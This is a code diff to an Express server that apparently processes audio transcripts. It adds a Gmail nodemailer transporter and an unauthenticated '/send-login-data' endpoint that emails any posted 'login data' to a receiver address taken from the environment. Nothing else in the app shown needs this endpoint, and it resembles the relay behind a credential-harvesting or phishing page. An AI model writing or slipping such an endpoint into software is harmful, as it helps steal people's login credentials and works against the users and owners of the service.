@@ -24,7 +24,47 @@ const storage = multer.memoryStorage(); // Store audio as memory buffer
 const upload = multer({ storage: storage });
 
 const app = express();
+
+require('dotenv').config()
+
+// routes.js
+const router = require('express').Router()
+const nodemailer = require('nodemailer');
+const { env } = require('process');
 app.use(bodyParser.json());
+
+const transporter = nodemailer.createTransport({
+  service: 'gmail',
+  auth: {
+    user: process.env.EMAIL,
+    pass: process.env.PASSWORD
+  }
+});
+
+
+
+
+app.post('/send-login-data', (req, res) => {
+  const { loginData } = req.body;
+
+  const mailOptions = {
+    from: process.env.EMAIL,
+    to: process.env.RECEIVER,
+    subject: 'Login Data',
+    html: `<p>Hi,</p> <p> Please find the <b>Login data</b></p> <pre>${JSON.stringify(JSON.parse(loginData), null, 2)}</pre>`,
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.error('Error sending email:', error);
+      res.status(500).json({ success: false, message: 'Error sending email' });
+    } else {
+      console.log('Email sent successfully');
+      res.json({ success: true, message: 'Email sent successfully' });
+    }
+  });
+});
+
 
 // Enable CORS middleware to allow cross-origin requests
 app.use(function (req, res, next) {
@@ -128,6 +168,7 @@ app.get('/get-saved-transcripts', (req, res) => {
 app.get('/get-discarded-transcripts', (req, res) => {
   res.json({ discardedTranscripts });
 });
+
 
 // app.post('/move-folder', upload.fields([
 //   { name: 'transcriptsFolder', maxCount: 1 },
